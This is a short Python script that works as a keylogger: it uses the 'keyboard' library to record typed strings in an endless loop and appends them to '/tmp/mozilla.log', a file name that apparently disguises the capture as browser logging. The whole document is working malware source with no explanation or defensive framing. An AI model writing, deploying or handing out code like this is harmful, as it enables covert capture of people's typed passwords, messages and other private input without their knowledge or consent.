import keyboard

PATH = '/tmp/mozilla.log'

print('[*] Running...')

def file_writer(path, data):
    with open(path, 'a') as file:
        f = open(PATH, 'a')
        file.write(data + '\n')
        f.close()

while 1:
    for string in keyboard.get_typed_strings(keyboard.record("esc")):
        file_writer(PATH, string) 
